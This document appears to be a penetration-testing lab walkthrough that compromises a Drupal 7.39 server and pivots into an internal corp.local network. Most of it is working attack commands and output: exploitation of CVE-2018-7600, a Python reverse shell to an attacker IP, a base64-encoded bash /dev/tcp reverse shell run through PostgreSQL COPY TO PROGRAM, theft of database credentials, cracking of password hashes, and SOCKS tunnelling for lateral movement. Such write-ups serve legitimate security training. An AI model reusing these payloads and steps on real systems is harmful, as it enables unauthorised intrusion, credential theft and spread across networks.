```
# nmap 172.16.23.0/24 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-13 09:40 CET
Nmap scan report for 172.16.23.1
Host is up (0.00041s latency).
All 1000 scanned ports on 172.16.23.1 are in ignored states.
Not shown: 995 filtered tcp ports (no-response), 5 filtered tcp ports (port-unreach)

Nmap scan report for 172.16.23.7
Host is up (0.00048s latency).
Not shown: 996 filtered tcp ports (no-response), 3 filtered tcp ports (port-unreach)
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for 172.16.23.56
Host is up (0.00044s latency).
Not shown: 997 filtered tcp ports (no-response), 1 filtered tcp ports (port-unreach)
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 256 IP addresses (3 hosts up) scanned in 13.93 seconds
```

On sait qu'il y a un domaine "corp.lab" et 172.16.23.56 a un serveur web donc on va edit notre /etc/hosts pour ajouter `172.16.23.56 corp.lab`

```
# nmap -p- -sVC 172.16.23.7
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-13 09:41 CET
Nmap scan report for 172.16.23.7
Host is up (0.00053s latency).
Not shown: 65380 filtered tcp ports (no-response), 154 filtered tcp ports (port-unreach)
PORT   STATE SERVICE VERSION
53/tcp open  domain  ISC BIND 9.16.27 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.16.27-Debian
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                             
Nmap done: 1 IP address (1 host up) scanned in 165.70 seconds

# nmap -p- -sVC 172.16.23.56
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-13 09:45 CET                                                                                                                                                                         
Nmap scan report for corp.lab (172.16.23.56)                                                                                                                                                                                               
Host is up (0.00047s latency).                                                                                                                                                                                                             
Not shown: 65381 filtered tcp ports (no-response), 152 filtered tcp ports (port-unreach)                                                                                                                                                   
PORT    STATE SERVICE  VERSION                                                                                                                                                                                                             
80/tcp  open  http     Apache httpd 2.4.54 ((Debian))                                                                                                                                                                                      
|_http-server-header: Apache/2.4.54 (Debian)                                                                                                                                                                                               
|_http-title: Apache2 Debian Default Page: It works                                                                                                                                                                                        
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.54 (Debian)
| ssl-cert: Subject: commonName=drupal.corp.lab/organizationName=drupal.corp.lab/stateOrProvinceName=France/countryName=FR
| Not valid before: 2022-09-06T06:46:02
|_Not valid after:  2050-01-21T06:46:02
|_http-title: Apache2 Debian Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.21 seconds
```

So there is a subdomain called drupal.corp.lab. We add `172.16.23.56 drupal.corp.lab` to the hosts file.
Going to `http://drupal.corp.lab` still gives us the "It works" page from Apache.

The actual drupal page is only accessible via https : `https://drupal.corp.lab`

That's an oooold drupal version (as we can see by all the "deprectated" warnings)

```
# dirb https://drupal.corp.lab/                                                                                                                                                                                                          

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jan 13 11:00:53 2026
URL_BASE: https://drupal.corp.lab/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://drupal.corp.lab/ ----
+ https://drupal.corp.lab/0 (CODE:200|SIZE:7994)                                                                                                                                                                                          
+ https://drupal.corp.lab/admin (CODE:403|SIZE:8101)                                                                                                                                                                                      
+ https://drupal.corp.lab/batch (CODE:403|SIZE:8236)                                                                                                                                                                                      
==> DIRECTORY: https://drupal.corp.lab/includes/                                                                                                                                                                                          
+ https://drupal.corp.lab/index.php (CODE:200|SIZE:7994)                                                                                                                                                                                  
+ https://drupal.corp.lab/install.mysql (CODE:403|SIZE:281)                                                                                                                                                                               
+ https://drupal.corp.lab/install.pgsql (CODE:403|SIZE:281)                                                                                                                                                                               
==> DIRECTORY: https://drupal.corp.lab/misc/                                                                                                                                                                                              
==> DIRECTORY: https://drupal.corp.lab/modules/                                                                                                                                                                                           
+ https://drupal.corp.lab/node (CODE:200|SIZE:7994)                                                                                                                                                                                       
==> DIRECTORY: https://drupal.corp.lab/profiles/                                                                                                                                                                                          
+ https://drupal.corp.lab/robots.txt (CODE:200|SIZE:1479)                                                                                                                                                                                 
+ https://drupal.corp.lab/Root (CODE:403|SIZE:281)                                                                                                                                                                                        
==> DIRECTORY: https://drupal.corp.lab/scripts/                                                                                                                                                                                           
+ https://drupal.corp.lab/search (CODE:403|SIZE:7944)                                                                                                                                                                                     
+ https://drupal.corp.lab/server-status (CODE:403|SIZE:281)                                                                                                                                                                               
==> DIRECTORY: https://drupal.corp.lab/sites/                                                                                                                                                                                             
==> DIRECTORY: https://drupal.corp.lab/themes/                                                                                                                                                                                            
+ https://drupal.corp.lab/user (CODE:200|SIZE:8169)                                                                                                                                                                                       
+ https://drupal.corp.lab/web.config (CODE:200|SIZE:2178)                                                                                                                                                                                 
+ https://drupal.corp.lab/xmlrpc.php (CODE:200|SIZE:42)    
```

We can start looking at robots.txt

In there we can see a lot of paths that should not be crawled (so of course we'll look in detail)

At /CHANGELOG.txt we see the drupal changelog so we know it's drupal 7.39 (from 2015!)

OR

Running droopescan (pip install droopescan) we get info on drupal

```
# droopescan scan drupal -u https://drupal.corp.lab
[+] Plugins found:                                                              
    profile https://drupal.corp.lab/modules/profile/
    php https://drupal.corp.lab/modules/php/
    image https://drupal.corp.lab/modules/image/

[+] Themes found:
    seven https://drupal.corp.lab/themes/seven/
    garland https://drupal.corp.lab/themes/garland/

[+] Possible version(s):
    7.39

[+] Possible interesting urls found:
    Default changelog file - https://drupal.corp.lab/CHANGELOG.txt
    Default admin - https://drupal.corp.lab/user/login

[+] Scan finished (0:03:15.084353 elapsed)
```

We could also use Drupwn (https://github.com/immunIT/drupwn.git)

```
# ./drupwn --mode exploit --target https://drupal.corp.lab --version 7.39                                                                                                                                                                

        ____
       / __ \_______  ______ _      ______
      / / / / ___/ / / / __ \ | /| / / __ \
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                     /_/
    
Commands available: list | quit | check [CVE_NUMBER] | exploit [CVE_NUMBER]
 
Drupwn> list
+---------------+----------------------------------------+---------------------------------+
|      CVE      |              Description               |        Versions affected        |
+---------------+----------------------------------------+---------------------------------+
| CVE-2018-7602 | Authenticated Remote Command Execution |           7.x <= 7.58           |
| CVE-2018-7600 |        Remote Command Execution        |      7.x < 7.58 & 8.x < 8.1     |
| CVE-2019-6340 |        Remote Command Execution        | 8.5.x < 8.5.11 & 8.6.x < 8.6.10 |
+---------------+----------------------------------------+---------------------------------+
 
Drupwn> exploit CVE-2018-7600

[+] Exploit completed. Webshell accessible at: https://drupal.corp.lab/sites/default/files/JQAEYP.php?c=CMD
```

But that one doesn't work, the injected php is not rendered so it breaks the webshell. At least we have the CVE number.

By typing "CVE-2018-7600 github" in a search engine we get something worth a look (https://github.com/firefart/CVE-2018-7600.git)

We modify the HOST variable in the script, and because it's an https target with a weird certificate we also have to add `verify=False` to the post commands.

We get `uid=33(www-data) gid=33(www-data) groups=33(www-data)` because by default it runs `id`. Now that it works let's do something more useful like a revshell

This one works : `python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.3",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'`

We catch it with `nc -lvp 443` and somehow it only gives us the control once we forcefully exit the python command on our machine...

Consolidate it (see box1.txt)

Now let's loot the machine to see if we can't bounce to something else.

We want to compromise the "dev" machine.

```
www-data@web:/var/www/drupal$ cat /etc/resolv.conf 
search corp.local
nameserver 10.0.0.20
```

The DNS server is local to the network

```
www-data@web:/var/www/drupal$ nslookup dev          
Server:         10.0.0.20
Address:        10.0.0.20#53

Name:   dev.corp.local
Address: 10.0.20.71
```

So it is inside an internal network

Sometimes the zone transfer protocol isn't deactivated so we can retrieve all dns records

```
www-data@web:/var/www/drupal$ dig corp.local AXFR                                                                                                                                                                                      
                                                                                                                                                                                                                                           
; <<>> DiG 9.16.27-Debian <<>> corp.local AXFR                                                                                                                                                                                             
;; global options: +cmd                                                                                                                                                                                                                    
corp.local.             604800  IN      SOA     ns.corp.local. 12. 604800 86400 2419200 604800 604800                                                                                                                                      
corp.local.             604800  IN      NS      ns.corp.local.                                                                                                                                                                             
corp.local.             604800  IN      A       10.0.0.20                                                                                                                                                                                  
db.corp.local.          604800  IN      A       10.0.20.12                                                                                                                                                                                 
dev.corp.local.         604800  IN      A       10.0.20.71                                                                                                                                                                                 
git.corp.local.         604800  IN      A       10.0.0.42                                                                                                                                                                                  
inf.corp.local.         604800  IN      A       10.0.0.100
ns.corp.local.          604800  IN      A       10.0.0.20
web.corp.local.         604800  IN      A       10.0.10.5
ws1.corp.local.         604800  IN      A       10.0.1.25
ws2.corp.local.         604800  IN      A       10.0.1.32
corp.local.             604800  IN      SOA     ns.corp.local. 12. 604800 86400 2419200 604800 604800
;; Query time: 28 msec
;; SERVER: 10.0.0.20#53(10.0.0.20)
;; WHEN: Tue Jan 20 08:38:21 UTC 2026
;; XFR size: 12 records (messages 1, bytes 329)
```

Well we have all the intel we need

Web servers often have databases attached we might be ale to get the connection details

```
www-data@web:/var/www/drupal$ cat sites/default/settings.php | grep "pass" -C5
...
--
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'vUIj3OcWtinZ',
      'host' => '10.0.20.12',
      'port' => '5432',
      'driver' => 'pgsql',
      'prefix' => '',
    ),
--
```

We don't have an ssh server accessible so we'll have to use https://github.com/kost/revsocks to forward nmap and other commands to the infected machine (called "web")

We download a precompiled binary to our machine `wget https://github.com/kost/revsocks/releases/download/v2.8/revsocks_linux_amd64 -O revsocks`

Then `python -m http.server 80` to expose the file to the "web" machine

On "web" we run `cd $(mktemp -d)` to get a folder we can actually write in, then `wget http://192.168.56.3/revsocks` and `chmod +x revsocks`

Then on kali `./revsocks -listen :80 -socks 127.0.0.1:1080 -pass password`
And on "web" `./revsocks -connect 192.168.56.3:80 -pass password`

Now port 8080 of our machine is redirected through the distant machine.

On the kali machine we will use proxychains to automagically proxy our commands through port 1080.
For that we need to edit `/etc/proxychains4.conf`, to modify the proxy list at the end :
```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

We also add the targets to our own `/etc/hosts` for convenience.

```
corp.local. 10.0.0.20
db.corp.local. 10.0.20.12
dev.corp.local. 10.0.20.71
git.corp.local. 10.0.0.42
inf.corp.local. 10.0.0.100
ns.corp.local. 10.0.0.20
web.corp.local. 10.0.10.5
ws1.corp.local. 10.0.1.25
ws2.corp.local. 10.0.1.32
```

Let's log in to the database : `proxychains psql -U drupal -h db.corp.local`, then we put in the password we got.

```
drupal=# SELECT usename, passwd FROM pg_shadow;
 usename  |               passwd                
----------+-------------------------------------
 postgres | 
 root     | md590d43f235b7a9cb4df622d06d09fa772
 drupal   | md531c153481af0e5bd4ffba3e645b261e3
 jim      | md5332072209f2c95d573816812d417d3bf
(4 rows)
```

Well well it's hash cracking time !

We format it well for john :
```
# cat psql_hashes 
root:90d43f235b7a9cb4df622d06d09fa772
drupal:31c153481af0e5bd4ffba3e645b261e3
jim:332072209f2c95d573816812d417d3bf
```

We can list hash formats for john:
```
# john --list=subformats | grep -i sql
UserFormat = dynamic_1015  type = dynamic_1015: md5(md5($p.$u).$s) (PostgreSQL 'pass the hash')
UserFormat = dynamic_1034  type = dynamic_1034: md5($p.$u) (PostgreSQL MD5)
```

Then `john psql_hashes --format=dynamic_1034 --wordlist=/usr/share/wordlists/rockyou.txt`

And we get the root password : `tesoro`

Let's get a revshell going inside the postgre machine

`nc -lvp 53` on our machine

`COPY (SELECT '') TO PROGRAM 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMy81MyAwPiYxCg= | base64 -d | bash';` inside postgre

And consolidate using `python3 -c 'import pty;pty.spawn("/bin/bash")'` (this revshell was really brittle)

Then `su -` to become root

Again we use `python -m http.server 80` in order to upload bins to the db machine.

`wget http://192.168.56.3/pspy` on to download it and `chmod +x pspy` then `./pspy`

At some point we get `2026/01/20 10:38:12 CMD: UID=1000  PID=4382   | /usr/lib/postgresql/13/bin/psql postgresql://jim:JimFromCorp123@localhost/drupal -c select * from flood limit 10`

So jim's password is `JimFromCorp123`

Now let's try to ssh into other machines using his credentials

`wget http://192.168.56.3/revsocks && chmod +x revsocks` then `./revsocks -connect 192.168.56.3:80 -pass password` (kill the other revsocks process on the web machine)

```
# cat targets.txt                                                                                                                                                                                                                        
10.0.0.20
10.0.20.12
10.0.20.71
10.0.0.42
10.0.0.100
10.0.0.20
10.0.10.5
10.0.1.25
10.0.1.32
```

`proxychains -q nmap -Pn -oA targets_corp.local_ssh -p 22 -sT --open -iL targets.txt -v`

It looks like we can ssh into a few machines
